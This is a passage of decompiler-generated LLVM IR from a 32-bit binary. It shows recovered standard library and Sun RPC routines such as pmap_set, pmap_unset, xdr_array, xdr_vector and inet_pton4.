  %v5_80591ba = call i32 @memcpy(i16* %tmp32, i32 %v0_80591b8, i32 32)
  %v3_80591c9 = call i32 @ioctl(i32 35091, i32 %v2_80591ae, i32 %v0_80591b5)
  %v2_80591d1 = icmp slt i32 %v3_80591c9, 0
  %v1_80591d3 = icmp eq i1 %v2_80591d1, false
  br i1 %v1_80591d3, label %dec_label_pc_80591df, label %dec_label_pc_80591d5

dec_label_pc_80591d5:                             ; preds = %dec_label_pc_80591ae
  br label %dec_label_pc_805918d

dec_label_pc_80591df:                             ; preds = %dec_label_pc_80591ae
  %v0_8059226.pre = load i32, i32* @esi, align 4
  br i1 %v3_80591e7, label %dec_label_pc_8059226, label %dec_label_pc_80591eb

dec_label_pc_80591eb:                             ; preds = %dec_label_pc_80591df
  %v1_80591eb = add i32 %v0_8059226.pre, 16
  %v2_80591eb = inttoptr i32 %v1_80591eb to i16*
  %v3_80591eb = load i16, i16* %v2_80591eb, align 2
  %v12_80591eb = icmp eq i16 %v3_80591eb, 2
  %v1_80591f0 = icmp eq i1 %v12_80591eb, false
  br i1 %v1_80591f0, label %dec_label_pc_8059226, label %dec_label_pc_80591f2

dec_label_pc_80591f2:                             ; preds = %dec_label_pc_80591eb
  br i1 %v1_80591f4, label %dec_label_pc_80591fd, label %dec_label_pc_80591f6

dec_label_pc_80591f6:                             ; preds = %dec_label_pc_80591f2
  br i1 %v1_80591fb, label %dec_label_pc_8059226, label %dec_label_pc_80591fd

dec_label_pc_80591fd:                             ; preds = %dec_label_pc_80591f6, %dec_label_pc_80591f2
  %tmp33 = inttoptr i32 %v0_805912a to i16*
  %v5_8059208 = call i32 @memcpy(i16* %tmp33, i32 %v1_80591eb, i32 16)
  %v1_8059211 = add i32 %v0_805912a, 2
  %v2_8059211 = inttoptr i32 %v1_8059211 to i16*
  store i16 28416, i16* %v2_8059211, align 2
  %v0_8059217 = load i32, i32* @ebp, align 4
  %v2_805921a = call i32 @__libc_close(i32 %v0_8059217)
  br label %dec_label_pc_8059253

dec_label_pc_8059226:                             ; preds = %dec_label_pc_80591df, %dec_label_pc_80591f6, %dec_label_pc_80591eb
  %v1_8059226 = add i32 %v0_8059226.pre, 32
  store i32 %v1_8059226, i32* @esi, align 4
  %v0_8059229 = load i32, i32* @edi, align 4
  %v1_8059229 = add i32 %v0_8059229, -32
  %v6_8059229 = icmp eq i32 %v1_8059229, 0
  store i32 %v1_8059229, i32* @edi, align 4
  %v1_805922e = icmp eq i1 %v6_8059229, false
  br i1 %v1_805922e, label %dec_label_pc_80591ae, label %dec_label_pc_8059234

dec_label_pc_8059234:                             ; preds = %dec_label_pc_8059226, %dec_label_pc_805919e
  br i1 %v1_8059239, label %dec_label_pc_8059248, label %dec_label_pc_805919e

dec_label_pc_8059248:                             ; preds = %dec_label_pc_8059234
  %v0_805924b = load i32, i32* @ebp, align 4
  %v1_805924c = call i32 @__libc_close(i32 %v0_805924b)
  br label %dec_label_pc_8059253

dec_label_pc_8059253:                             ; preds = %dec_label_pc_80591fd, %dec_label_pc_8059248
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8059248 ], [ 1, %dec_label_pc_80591fd ]
  %v2_8059259 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059259, i32* @ebx, align 4
  store i32 %v0_8059122, i32* @esi, align 4
  store i32 %v0_8059121, i32* @edi, align 4
  store i32 %v0_8059120, i32* @ebp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_8059226, { 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 18, 17, 14, 13, 12, 11, 10, 9, 4, 16, 15, 3, 2, 5 }
  uselistorder i16 28416, { 1, 0 }
  uselistorder i16 2, { 0, 8, 1, 4, 5, 6, 10, 2, 3, 7, 9 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 1, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 3, 2, 8, 7, 0, 1, 6, 9, 5, 4 }
  uselistorder i32 4096, { 10, 2, 13, 3, 14, 15, 4, 12, 8, 11, 5, 9, 6, 1, 7, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 0, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_8059253, { 1, 0 }
  uselistorder label %dec_label_pc_8059226, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80591ae, { 1, 0 }
  uselistorder label %dec_label_pc_805918d, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805925e = load i32, i32* @ebx, align 4
  %v2_8059262 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8059262, i32* @ebx, align 4
  store i32 %v2_8059262, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  %v2_8059270 = call i32 @__get_myaddress(i32 -1, i32 %v0_805925e)
  %v1_8059275 = icmp eq i32 %v2_8059270, 0
  br i1 %v1_8059275, label %entry.dec_label_pc_8059309_crit_edge, label %dec_label_pc_805927d

entry.dec_label_pc_8059309_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8059309

dec_label_pc_805927d:                             ; preds = %entry
  %v2_8059287 = ptrtoint i32* %stack_var_-8 to i32
  %v9_80592a0 = call i32 @__GI_clntudp_bufcreate(i32 %v2_8059262, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8059287, i32 400, i32 400)
  %v1_80592a8 = icmp eq i32 %v9_80592a0, 0
  store i32 %v9_80592a0, i32* %ebx.global-to-local, align 4
  br i1 %v1_80592a8, label %dec_label_pc_8059309, label %dec_label_pc_80592ae

dec_label_pc_80592ae:                             ; preds = %dec_label_pc_805927d
  %v1_80592d6 = add i32 %v9_80592a0, 4
  %v2_80592d6 = inttoptr i32 %v1_80592d6 to i32*
  %v3_80592d6 = load i32, i32* %v2_80592d6, align 4
  store i32 %v3_80592d6, i32* @ecx, align 4
  %v5_80592f4 = inttoptr i32 %v3_80592d6 to i32*
  %v6_80592f4 = load i32, i32* %v5_80592f4, align 4
  call void @__pseudo_call(i32 %v6_80592f4)
  %v0_80592f6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80592f6 = add i32 %v0_80592f6, 4
  %v2_80592f6 = inttoptr i32 %v1_80592f6 to i32*
  %v3_80592f6 = load i32, i32* %v2_80592f6, align 4
  %v5_80592fd = add i32 %v3_80592f6, 16
  %v6_80592fd = inttoptr i32 %v5_80592fd to i32*
  %v7_80592fd = load i32, i32* %v6_80592fd, align 4
  call void @__pseudo_call(i32 %v7_80592fd)
  %v2_805930e.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805930b

dec_label_pc_8059309:                             ; preds = %entry.dec_label_pc_8059309_crit_edge, %dec_label_pc_805927d
  br label %dec_label_pc_805930b

dec_label_pc_805930b:                             ; preds = %dec_label_pc_80592ae, %dec_label_pc_8059309
  %v2_805930e = phi i32 [ %v2_805930e.pre, %dec_label_pc_80592ae ], [ %tmp12, %dec_label_pc_8059309 ]
  %v0_805930f = phi i32 [ %tmp, %dec_label_pc_80592ae ], [ 0, %dec_label_pc_8059309 ]
  store i32 %v2_805930e, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805930f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_805930b, { 1, 0 }
  uselistorder label %dec_label_pc_8059309, { 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i16 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8059311 = load i32, i32* @ebx, align 4
  %v2_8059315 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8059315, i32* @ebx, align 4
  %v4_8059319 = zext i16 %arg4 to i32
  store i32 %v4_8059319, i32* @esi, align 4
  store i32 %v2_8059315, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v2_8059328 = call i32 @__get_myaddress(i32 -1, i32 %v0_8059311)
  %v1_805932d = icmp eq i32 %v2_8059328, 0
  br i1 %v1_805932d, label %entry.dec_label_pc_80593dc_crit_edge, label %dec_label_pc_8059335

entry.dec_label_pc_80593dc_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80593dc

dec_label_pc_8059335:                             ; preds = %entry
  %v2_805933f = ptrtoint i32* %stack_var_-12 to i32
  %sext = mul i32 %v2_805933f, 65536
  %v6_8059358 = sdiv i32 %sext, 65536
  %v10_8059358 = call i32 @__GI_clntudp_bufcreate(i32 %v2_8059315, i32 100000, i32 2, i32 5, i32* null, i32 %v6_8059358, i32 400, i32 400)
  %v1_8059360 = icmp eq i32 %v10_8059358, 0
  store i32 %v10_8059358, i32* @ebx, align 4
  br i1 %v1_8059360, label %dec_label_pc_80593dc, label %dec_label_pc_80593c9

dec_label_pc_80593c9:                             ; preds = %dec_label_pc_8059335
  %v1_805938a = add i32 %v10_8059358, 4
  %v2_805938a = inttoptr i32 %v1_805938a to i32*
  %v3_805938a = load i32, i32* %v2_805938a, align 4
  store i32 %v3_805938a, i32* @ecx, align 4
  %v5_80593a8 = inttoptr i32 %v3_805938a to i32*
  %v6_80593a8 = load i32, i32* %v5_80593a8, align 4
  call void @__pseudo_call(i32 %v6_80593a8)
  %v0_80593b1 = load i32, i32* @esi, align 4
  %v0_80593b8 = load i32, i32* @ebx, align 4
  %sext7 = mul i32 %v0_80593b1, 65536
  %v3_80593b9 = sdiv i32 %sext7, 65536
  %v5_80593b9 = call i32 @clnt_perror(i32 %v0_80593b8, i32 ptrtoint ([24 x i8]* @global_var_805d064.343 to i32), i32 %v3_80593b9, i32 %v0_80593b1)
  %v0_80593c9 = load i32, i32* @ebx, align 4
  %v1_80593c9 = add i32 %v0_80593c9, 4
  %v2_80593c9 = inttoptr i32 %v1_80593c9 to i32*
  %v3_80593c9 = load i32, i32* %v2_80593c9, align 4
  %v5_80593d0 = add i32 %v3_80593c9, 16
  %v6_80593d0 = inttoptr i32 %v5_80593d0 to i32*
  %v7_80593d0 = load i32, i32* %v6_80593d0, align 4
  call void @__pseudo_call(i32 %v7_80593d0)
  br label %dec_label_pc_80593de

dec_label_pc_80593dc:                             ; preds = %entry.dec_label_pc_80593dc_crit_edge, %dec_label_pc_8059335
  br label %dec_label_pc_80593de

dec_label_pc_80593de:                             ; preds = %dec_label_pc_80593c9, %dec_label_pc_80593dc
  %v0_80593e3 = phi i32 [ %tmp, %dec_label_pc_80593c9 ], [ 0, %dec_label_pc_80593dc ]
  ret i32 %v0_80593e3

; uselistorder directives
  uselistorder i32 %v0_80593b1, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32* null, { 0, 1, 3, 2, 7, 4, 8, 9, 5, 6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_80593de, { 1, 0 }
  uselistorder label %dec_label_pc_80593dc, { 1, 0 }
}

define i32 @_rpc_dtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80593e7 = load i32, i32* @global_var_80677b0.344, align 16
  %v1_80593e7 = icmp eq i32 %v0_80593e7, 0
  %v1_80593ee = icmp eq i1 %v1_80593e7, false
  br i1 %v1_80593ee, label %dec_label_pc_80593fa, label %dec_label_pc_80593f0

dec_label_pc_80593f0:                             ; preds = %entry
  %v0_80593f0 = call i32 @getdtablesize()
  store i32 %v0_80593f0, i32* @global_var_80677b0.344, align 16
  br label %dec_label_pc_80593fa

dec_label_pc_80593fa:                             ; preds = %entry, %dec_label_pc_80593f0
  %v0_80593fa = phi i32 [ %v0_80593e7, %entry ], [ %v0_80593f0, %dec_label_pc_80593f0 ]
  ret i32 %v0_80593fa

; uselistorder directives
  uselistorder label %dec_label_pc_80593fa, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8059409 = load i32, i32* @ebx, align 4
  store i32 %v0_8059409, i32* %stack_var_-16, align 4
  store i32 %arg4, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v10_805942f22 = icmp eq i32 %arg3, 0
  br i1 %v10_805942f22, label %dec_label_pc_8059435, label %dec_label_pc_805941b

dec_label_pc_805941b:                             ; preds = %entry, %dec_label_pc_805942c
  call void @__pseudo_call(i32 %arg5)
  %v0_8059428 = load i32, i32* @eax, align 4
  %v1_8059428 = icmp eq i32 %v0_8059428, 0
  br i1 %v1_8059428, label %dec_label_pc_805943a, label %dec_label_pc_805942c

dec_label_pc_805942c:                             ; preds = %dec_label_pc_805941b
  %v0_805942c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805942c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805942c = add i32 %v1_805942c, %v0_805942c
  store i32 %v2_805942c, i32* %ebx.global-to-local, align 4
  %v0_805942e = load i32, i32* %esi.global-to-local, align 4
  %v1_805942e = add i32 %v0_805942e, 1
  store i32 %v1_805942e, i32* %esi.global-to-local, align 4
  %v10_805942f = icmp ult i32 %v1_805942e, %arg3
  br i1 %v10_805942f, label %dec_label_pc_805941b, label %dec_label_pc_8059435

dec_label_pc_8059435:                             ; preds = %entry, %dec_label_pc_805942c
  br label %dec_label_pc_805943a

dec_label_pc_805943a:                             ; preds = %dec_label_pc_805941b, %dec_label_pc_8059435
  %v2_805943d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805943d, i32* %ebx.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805943a, { 1, 0 }
  uselistorder label %dec_label_pc_8059435, { 1, 0 }
  uselistorder label %dec_label_pc_805941b, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp7 = sext i32 %arg6 to i64
  %stack_var_0 = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg1 to i32
  store i32 %tmp13, i32* %stack_var_0, align 4
  %v0_8059442 = load i32, i32* @ebp, align 4
  %v0_8059443 = load i32, i32* @edi, align 4
  %v0_8059444 = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @eax, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v1_8059451 = inttoptr i32 %arg3 to i32*
  %tmp24 = inttoptr i32 %arg2 to i32*
  %v6_8059458 = call i32 @xdr_u_long(i32* %tmp24, i32 %arg4)
  store i32 %v6_8059458, i32* %eax.global-to-local, align 4
  %v1_8059460 = icmp eq i32 %v6_8059458, 0
  br i1 %v1_8059460, label %dec_label_pc_805953a, label %dec_label_pc_8059468

dec_label_pc_8059468:                             ; preds = %entry
  %v0_8059468 = load i32, i32* %esi.global-to-local, align 4
  %v1_8059468 = inttoptr i32 %v0_8059468 to i32*
  %v2_8059468 = load i32, i32* %v1_8059468, align 4
  store i32 %v2_8059468, i32* @edi, align 4
  %v6_805946e = icmp ugt i32 %v2_8059468, %arg5
  br i1 %v6_805946e, label %dec_label_pc_805947d, label %dec_label_pc_8059470

dec_label_pc_8059470:                             ; preds = %dec_label_pc_8059468
  %v12_8059475 = udiv i64 4294967295, %tmp7
  %v13_8059475 = trunc i64 %v12_8059475 to i32
  store i32 %v13_8059475, i32* %eax.global-to-local, align 4
  %v14_8059475 = urem i64 4294967295, %tmp7
  %v15_8059475 = trunc i64 %v14_8059475 to i32
  store i32 %v15_8059475, i32* @edx, align 4
  %tmp = icmp ugt i32 %v2_8059468, %v13_8059475
  br i1 %tmp, label %dec_label_pc_805947d, label %dec_label_pc_805948a

dec_label_pc_805947d:                             ; preds = %dec_label_pc_8059470, %dec_label_pc_8059468
  store i32 %arg2, i32* @edx, align 4
  %v2_8059481 = load i32, i32* %tmp24, align 4
  %v11_8059481 = icmp eq i32 %v2_8059481, 2
  %v1_8059484 = icmp eq i1 %v11_8059481, false
  br i1 %v1_8059484, label %dec_label_pc_805953a, label %dec_label_pc_805948a

dec_label_pc_805948a:                             ; preds = %dec_label_pc_8059470, %dec_label_pc_805947d
  %v0_805948a = load i32, i32* @ebx, align 4
  %v1_805948a = icmp eq i32 %v0_805948a, 0
  %v1_805948c = icmp eq i1 %v1_805948a, false
  br i1 %v1_805948c, label %dec_label_pc_80594ed, label %dec_label_pc_805948e

dec_label_pc_805948e:                             ; preds = %dec_label_pc_805948a
  store i32 %arg2, i32* @edx, align 4
  %v2_8059492 = load i32, i32* %tmp24, align 4
  store i32 %v2_8059492, i32* %eax.global-to-local, align 4
  %v9_8059494 = icmp eq i32 %v2_8059492, 1
  br i1 %v9_8059494, label %dec_label_pc_80594a3, label %dec_label_pc_8059499

dec_label_pc_8059499:                             ; preds = %dec_label_pc_805948e
  %v9_8059499 = icmp eq i32 %v2_8059492, 2
  %v1_805949c = icmp eq i1 %v9_8059499, false
  br i1 %v1_805949c, label %dec_label_pc_80594ed, label %dec_label_pc_805953e

dec_label_pc_80594a3:                             ; preds = %dec_label_pc_805948e
  %v1_80594a3 = icmp eq i32 %v2_8059468, 0
  br i1 %v1_80594a3, label %dec_label_pc_805953e, label %dec_label_pc_80594ab

dec_label_pc_80594ab:                             ; preds = %dec_label_pc_80594a3
  %v4_80594b2 = mul i32 %v2_8059468, %arg6
  store i32 %v4_80594b2, i32* @esi, align 4
  %v2_80594b6 = call i32 @malloc(i32 %v4_80594b2)
  store i32 %v2_80594b6, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_80594c4 = icmp eq i32 %v2_80594b6, 0
  store i32 %v2_80594b6, i32* %v1_8059451, align 4
  %v1_80594c8 = icmp eq i1 %v1_80594c4, false
  br i1 %v1_80594c8, label %dec_label_pc_80594e0, label %dec_label_pc_80594ca

dec_label_pc_80594ca:                             ; preds = %dec_label_pc_80594ab
  store i32 0, i32* @esi, align 4
  %v0_80594ce = load i32, i32* @global_var_8062b70, align 16
  %v3_80594d9 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_805d08c.345 to i32), i32 %v0_80594ce)
  store i32 %v3_80594d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059535

dec_label_pc_80594e0:                             ; preds = %dec_label_pc_80594ab
  %v0_80594e1 = load i32, i32* @esi, align 4
  %v0_80594e4 = load i32, i32* @ebx, align 4
  %v5_80594e4 = inttoptr i32 %v0_80594e4 to i8*
  %v5_80594e5 = call i32 @__GI_memset(i8* %v5_80594e4, i32 0, i32 %v0_80594e1)
  store i32 %v5_80594e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80594ed

dec_label_pc_80594ed:                             ; preds = %dec_label_pc_8059499, %dec_label_pc_805948a, %dec_label_pc_80594e0
  store i32 0, i32* @ebp, align 4
  store i32 1, i32* @esi, align 4
  %v7_805950c26 = icmp ne i32 %v2_8059468, 0
  %v1_805950e31 = icmp eq i1 %v7_805950c26, false
  br i1 %v1_805950e31, label %dec_label_pc_8059514, label %dec_label_pc_8059510

dec_label_pc_80594f6:                             ; preds = %dec_label_pc_8059510
  %v1_80594f7 = add i32 %v0_80594f733, 1
  store i32 %v1_80594f7, i32* @ebp, align 4
  call void @__pseudo_call(i32 %arg6)
  %v0_8059503 = load i32, i32* @ebx, align 4
  %v5_8059503 = add i32 %v0_8059503, %arg5
  store i32 %v5_8059503, i32* @ebx, align 4
  %v0_805950a = load i32, i32* %eax.global-to-local, align 4
  %v0_805950c.pre = load i32, i32* @ebp, align 4
  store i32 %v0_805950a, i32* @esi, align 4
  %v7_805950c = icmp ult i32 %v0_805950c.pre, %v2_8059468
  %v1_805950e = icmp eq i1 %v7_805950c, false
  br i1 %v1_805950e, label %dec_label_pc_8059514, label %dec_label_pc_8059510

dec_label_pc_8059510:                             ; preds = %dec_label_pc_80594ed, %dec_label_pc_80594f6
  %v0_805951034 = phi i32 [ %v0_805950a, %dec_label_pc_80594f6 ], [ 1, %dec_label_pc_80594ed ]
  %v0_80594f733 = phi i32 [ %v0_805950c.pre, %dec_label_pc_80594f6 ], [ 0, %dec_label_pc_80594ed ]
  %v1_8059510 = icmp eq i32 %v0_805951034, 0
  %v1_8059512 = icmp eq i1 %v1_8059510, false
  br i1 %v1_8059512, label %dec_label_pc_80594f6, label %dec_label_pc_8059514

dec_label_pc_8059514:                             ; preds = %dec_label_pc_80594f6, %dec_label_pc_8059510, %dec_label_pc_80594ed
  %v0_8059510.lcssa = phi i32 [ 1, %dec_label_pc_80594ed ], [ %v0_805951034, %dec_label_pc_8059510 ], [ %v0_805950a, %dec_label_pc_80594f6 ]
  %v3_8059514 = load i32, i32* %stack_var_0, align 4
  %v1_8059518 = inttoptr i32 %v3_8059514 to i32*
  %v2_8059518 = load i32, i32* %v1_8059518, align 4
  %v11_8059518 = icmp eq i32 %v2_8059518, 2
  %v1_805951b = icmp eq i1 %v11_8059518, false
  br i1 %v1_805951b, label %dec_label_pc_8059543, label %dec_label_pc_805951d

dec_label_pc_805951d:                             ; preds = %dec_label_pc_8059514
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_8059524 = load i32, i32* %v1_8059451, align 4
  %v2_8059526 = call i32 @free(i32 %v2_8059524)
  store i32 %v2_8059526, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8059451, align 4
  br label %dec_label_pc_8059535

dec_label_pc_8059535:                             ; preds = %dec_label_pc_80594ca, %dec_label_pc_805951d
  %v0_8059546.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8059543

dec_label_pc_805953a:                             ; preds = %dec_label_pc_805947d, %entry
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059543

dec_label_pc_805953e:                             ; preds = %dec_label_pc_8059499, %dec_label_pc_80594a3
  store i32 1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059543

dec_label_pc_8059543:                             ; preds = %dec_label_pc_8059514, %dec_label_pc_805953a, %dec_label_pc_8059535, %dec_label_pc_805953e
  %v0_8059546 = phi i32 [ %v0_8059510.lcssa, %dec_label_pc_8059514 ], [ 0, %dec_label_pc_805953a ], [ %v0_8059546.pre, %dec_label_pc_8059535 ], [ 1, %dec_label_pc_805953e ]
  store i32 %v0_8059546, i32* %eax.global-to-local, align 4
  store i32 %v0_8059444, i32* %esi.global-to-local, align 4
  store i32 %v0_8059443, i32* @edi, align 4
  store i32 %v0_8059442, i32* @ebp, align 4
  ret i32 %v0_8059546

; uselistorder directives
  uselistorder i32 %v0_8059546, { 1, 0 }
  uselistorder i32 %v4_80594b2, { 1, 0 }
  uselistorder i32 %v2_8059468, { 4, 2, 0, 3, 1, 5, 6 }
  uselistorder i32* %v1_8059451, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i64 4294967295, { 0, 1, 3, 2 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 20, 17, 18, 5, 15, 16, 19, 3, 0, 6, 7, 1, 8, 4, 12, 13, 14, 2, 9, 10, 11 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059543, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805953e, { 1, 0 }
  uselistorder label %dec_label_pc_8059535, { 1, 0 }
  uselistorder label %dec_label_pc_8059514, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059510, { 1, 0 }
  uselistorder label %dec_label_pc_80594ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805948a, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059556 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8059559 = load i32, i32* @ebx, align 4
  store i32 %v0_8059559, i32* %stack_var_-16, align 4
  %v0_805955a = load i32, i32* @eax, align 4
  store i32 %v0_805955a, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_805955c = ptrtoint i32* %stack_var_-44 to i32
  %v2_805955f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805955f, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80595a715 = inttoptr i32 %v0_805955a to i8*
  %v2_80595a716 = load i8, i8* %v1_80595a715, align 1
  %v3_80595a717 = sext i8 %v2_80595a716 to i32
  store i32 %v3_80595a717, i32* @ecx, align 4
  %v1_80595aa18 = add i32 %v0_805955a, 1
  store i32 %v1_80595aa18, i32* %ebx.global-to-local, align 4
  %v1_80595ab19 = icmp eq i8 %v2_80595a716, 0
  store i1 %v1_80595ab19, i1* %zf.global-to-local, align 1
  %v1_80595ad21 = icmp eq i1 %v1_80595ab19, false
  br i1 %v1_80595ad21, label %dec_label_pc_805956a, label %dec_label_pc_80595af

dec_label_pc_805956a:                             ; preds = %entry, %dec_label_pc_80595a7.backedge
  %v3_80595a723 = phi i32 [ %v3_80595a7, %dec_label_pc_80595a7.backedge ], [ %v3_80595a717, %entry ]
  %v2_80595a722 = phi i8 [ %v2_80595a7, %dec_label_pc_80595a7.backedge ], [ %v2_80595a716, %entry ]
  %v1_805956a = add nsw i32 %v3_80595a723, -48
  store i32 %v1_805956a, i32* @eax, align 4
  %v9_805956d = icmp eq i8 %v2_80595a722, 57
  store i1 %v9_805956d, i1* %zf.global-to-local, align 1
  %v6_8059570 = icmp ugt i32 %v1_805956a, 9
  br i1 %v6_8059570, label %dec_label_pc_8059593, label %dec_label_pc_8059572

dec_label_pc_8059572:                             ; preds = %dec_label_pc_805956a
  %v0_8059572 = load i32, i32* @esi, align 4
  %v1_8059572 = inttoptr i32 %v0_8059572 to i8*
  %v2_8059572 = load i8, i8* %v1_8059572, align 1
  %v2_8059575 = zext i8 %v2_8059572 to i32
  %v3_8059575 = mul nuw nsw i32 %v2_8059575, 10
  %v3_8059578 = add nsw i32 %v3_8059575, %v1_805956a
  store i32 %v3_8059578, i32* @eax, align 4
  %v9_805957c = icmp eq i32 %v3_8059578, 255
  store i1 %v9_805957c, i1* %zf.global-to-local, align 1
  %v6_8059581 = icmp ugt i32 %v3_8059578, 255
  br i1 %v6_8059581, label %dec_label_pc_80595cc, label %dec_label_pc_8059583

dec_label_pc_8059583:                             ; preds = %dec_label_pc_8059572
  %v0_8059583 = load i32, i32* @edx, align 4
  %v1_8059583 = icmp eq i32 %v0_8059583, 0
  store i1 %v1_8059583, i1* %zf.global-to-local, align 1
  %v1_8059585 = trunc i32 %v3_8059578 to i8
  store i8 %v1_8059585, i8* %v1_8059572, align 1
  %v0_8059587 = load i1, i1* %zf.global-to-local, align 1
  %v1_8059587 = icmp eq i1 %v0_8059587, false
  br i1 %v1_8059587, label %dec_label_pc_80595a7.backedge, label %dec_label_pc_8059589

dec_label_pc_8059589:                             ; preds = %dec_label_pc_8059583
  %v0_8059589 = load i32, i32* @edi, align 4
  %v1_8059589 = add i32 %v0_8059589, 1
  store i32 %v1_8059589, i32* @edi, align 4
  %v1_805958a = add i32 %v0_8059589, -3
  %v6_805958a = sub i32 2, %v0_8059589
  %v7_805958a = and i32 %v6_805958a, %v1_8059589
  %v8_805958a = icmp slt i32 %v7_805958a, 0
  %v9_805958a = icmp eq i32 %v1_805958a, 0
  store i1 %v9_805958a, i1* %zf.global-to-local, align 1
  %v10_805958a = icmp slt i32 %v1_805958a, 0
  %v3_805958d = icmp eq i1 %v10_805958a, %v8_805958a
  %v4_805958d = icmp eq i1 %v9_805958a, false
  %v5_805958d = and i1 %v4_805958d, %v3_805958d
  br i1 %v5_805958d, label %dec_label_pc_80595cc, label %dec_label_pc_805958f

dec_label_pc_805958f:                             ; preds = %dec_label_pc_8059589
  %v0_805958f = load i32, i32* @edx, align 4
  %v1_805958f = and i32 %v0_805958f, -256
  %v2_805958f = or i32 %v1_805958f, 1
  store i32 %v2_805958f, i32* @edx, align 4
  br label %dec_label_pc_80595a7.backedge

dec_label_pc_8059593:                             ; preds = %dec_label_pc_805956a
  %v9_8059593 = icmp eq i8 %v2_80595a722, 46
  store i1 %v9_8059593, i1* %zf.global-to-local, align 1
